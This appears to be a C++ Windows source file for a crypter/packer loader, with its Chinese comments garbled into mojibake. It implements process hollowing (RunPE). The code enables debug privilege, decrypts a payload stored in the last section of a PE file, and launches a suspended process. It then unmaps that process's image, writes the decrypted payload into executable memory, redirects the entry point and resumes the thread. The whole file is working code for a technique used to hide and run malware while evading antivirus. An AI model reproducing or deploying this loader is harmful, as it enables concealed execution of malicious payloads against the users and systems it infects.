#include <windows.h>
#include <tchar.h>
#include "PETools.h"
#include "PETools.cpp"

typedef DWORD(WINAPI* pZwUnmapViewOfSection)(HANDLE, PVOID);

/**
 * ��Ȩ
 */
BOOL AdjustPrivileges(HANDLE hProcess, LPCTSTR lpPrivilegeName)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tokenPrivileges;
	if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
	{
		LUID luid;
		if (LookupPrivilegeValue(NULL, lpPrivilegeName, &luid))
		{
			tokenPrivileges.PrivilegeCount = 1;
			tokenPrivileges.Privileges[0].Luid = luid;
			tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL))
				return TRUE;
		}
		CloseHandle(hToken);
	}
	return FALSE;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	TCHAR exePath[MAX_PATH]{ 0 };
	LPWSTR* argv;
	int argc;

	//��ȡ�����в���
	argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	if (argv) {
		//��ȡ��ǰ���е�EXE��·��
		_tcscpy_s(exePath, MAX_PATH, argv[0]);
		//�ͷŷ�����ڴ�
		LocalFree(argv);
	}

	if (!AdjustPrivileges(GetCurrentProcess(), SE_DEBUG_NAME))
	{
		MessageBox(NULL, TEXT("��Ȩʧ��"), TEXT("��ʾ"), MB_OK);
		return -1;
	}

	_tcscpy_s(exePath, MAX_PATH, TEXT("I:\\cpp_projects\\EncryptDecryptShell\\Debug\\123.exe"));

	//1����ȡ��ģ�������
	PETools pe;
	LPVOID fileBuf = NULL;
	LPVOID imageBuf = NULL;
	pe.ReadPEFile(exePath, &fileBuf);

	//��ȡ���һ����
	PIMAGE_SECTION_HEADER last_section = pe.GetLastSection(fileBuf);
	//�����ڴ棬����ԭ��SRC������
	//��SizeOfRawData��Misc.VirtualSize��һ������Ϊ������ֵ������ӽ�ʱ������һ���ġ�
	DWORD srcSize = last_section->SizeOfRawData;
	LPBYTE srcData = (LPBYTE)malloc(srcSize);
	if (srcData == NULL)
	{
		MessageBox(NULL, TEXT("�����ڴ�ʧ��"), TEXT("��ʾ"), MB_OK);
		return -1;
	}
	memset(srcData, 0, srcSize);
	memcpy(srcData, (LPBYTE)fileBuf + last_section->PointerToRawData, srcSize);

	//2����SRC���ݽ��н���
	pe.Decrypt(srcData, srcSize);

	//3���Թ������ʽ��������
	STARTUPINFO si{ 0 };
	GetStartupInfo(&si);
	PROCESS_INFORMATION pi{ 0 };
	if (!CreateProcess(NULL, exePath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		MessageBox(NULL, TEXT("��������ʧ��"), TEXT("��ʾ"), MB_OK);
		return -1;
	}

	//4����ȡ��ǳ����context������Ҫ��
	CONTEXT ctx{ 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);

	//5��ж����ǳ���
	HMODULE nt = LoadLibrary(TEXT("ntdll.dll"));
	pZwUnmapViewOfSection ZwUnmapViewOfSection = (pZwUnmapViewOfSection)GetProcAddress(nt, "ZwUnmapViewOfSection");
	if (ZwUnmapViewOfSection == NULL)
	{
		MessageBox(NULL, TEXT("��ȡZwUnmapViewOfSectionʧ��"), TEXT("��ʾ"), MB_OK);
		return -1;
	}
	ZwUnmapViewOfSection(pi.hProcess, GetModuleHandle(NULL));

	//6����ָ����λ�÷���ռ䣺λ�þ���SRC��ImageBase  ��С����SRC��SizeOfImage
	PIMAGE_OPTIONAL_HEADER optHeader = pe.GetOptionHeader(srcData);

	LPVOID address = VirtualAllocEx(pi.hProcess, (LPVOID)optHeader->ImageBase, optHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (address == NULL)
	{
		TCHAR msg[MAX_PATH]{ 0 };
		_stprintf_s(msg, MAX_PATH, TEXT("%s %d"), TEXT("����ռ�ʧ��"), GetLastError());
		MessageBox(NULL, msg, TEXT("��ʾ"), MB_OK);
		return -1;
	}

	//7������ɹ�����SRC��PE�ļ����� ���Ƶ��ÿռ���	
	pe.FileBufferToImageBuffer(srcData, &imageBuf);

	if (!WriteProcessMemory(pi.hProcess, address, imageBuf, optHeader->SizeOfImage, NULL))
	{
		MessageBox(NULL, TEXT("д��SRCʧ��"), TEXT("��ʾ"), MB_OK);
		return -1;
	}

	//10���޸���ǳ����Context
	//��Context��ImageBase�ĳ�SRC��ImageBase
	DWORD imageBase = (DWORD)address;
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &imageBase, 4, NULL))
	{
		MessageBox(NULL, TEXT("д��ImageBaseʧ��"), TEXT("��ʾ"), MB_OK);
		return -1;
	}

	//��Context��OEP�ĳ�SRC��OEP	
	ctx.Eax = optHeader->AddressOfEntryPoint + imageBase;


	//11������Context ���ָ����߳�		
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);

	//�ͷ���Դ
	free(fileBuf);
	free(imageBuf);
	free(srcData);

	return 0;
}